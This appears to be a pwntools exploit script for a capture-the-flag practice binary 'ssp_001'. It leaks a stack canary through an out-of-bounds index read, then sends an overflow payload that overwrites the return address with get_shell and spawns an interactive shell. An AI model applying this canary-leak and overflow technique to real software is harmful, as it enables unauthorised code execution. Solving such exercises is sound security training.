from pwn import *

def slog(n, m):
    return success(': '.join([n, hex(m)]))
p = process('./ssp_001')
e = ELF('./ssp_001')
context.arch='i386'

canary = b''
get_shell=e.symbols['get_shell']

for i in range(0x83, 0x7f, -1):
    p.sendafter(b'> ', b'P')
    p.sendlineafter(b'Element index : ', bytes(str(i), 'utf-8'))
    p.recvuntil(b'is : ')
    canary += p.recv(2)
print(canary)
canary = int(canary, 16)
print(canary)
slog("canary", canary)

payload = b'A'*64
payload += p32(canary)
payload +=b'B'*8
payload += p32(get_shell)

p.sendafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', bytes(str(len(payload)),'utf-8'))
p.sendafter(b'Name : ', payload)
p.interactive()